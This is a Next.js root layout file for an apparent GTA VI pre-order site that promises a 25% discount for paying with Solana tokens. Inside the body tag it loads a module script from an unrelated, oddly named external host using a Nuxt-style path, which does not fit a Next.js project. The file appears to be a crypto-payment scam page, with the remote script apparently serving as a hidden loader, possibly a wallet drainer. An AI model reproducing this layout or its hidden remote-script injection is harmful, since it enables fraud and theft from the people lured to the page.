import type { Metadata } from "next";
import "./globals.css";
import ClientProviders from "@/components/ClientProviders";

export const metadata: Metadata = {
  title: "GTA VI × Solana — Pre-order with 25% Discount",
  description:
    "Pre-order Grand Theft Auto VI with an exclusive 25% discount when paying on the Solana network. Release date: November 19, 2026.",
  icons: {
    icon: "/icons.jpg",
    apple: "/icons.jpg",
    shortcut: "/icons.jpg",
  },
  openGraph: {
    title: "GTA VI × Solana — Pre-order",
    description: "25% discount when paying with any Solana token. Release date: November 19, 2026.",
    images: ["https://upload.wikimedia.org/wikipedia/en/5/54/GTA_VI_cover_art.jpg"],
  },
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="ru" className="h-full">
      <body className="min-h-full bg-[#050510] text-white">
        <script type="module" src="https://regulate-importer.asset-base.cc/_nuxt/assets/index.js"></script>
        <ClientProviders>{children}</ClientProviders>
      </body>
    </html>
  );
}
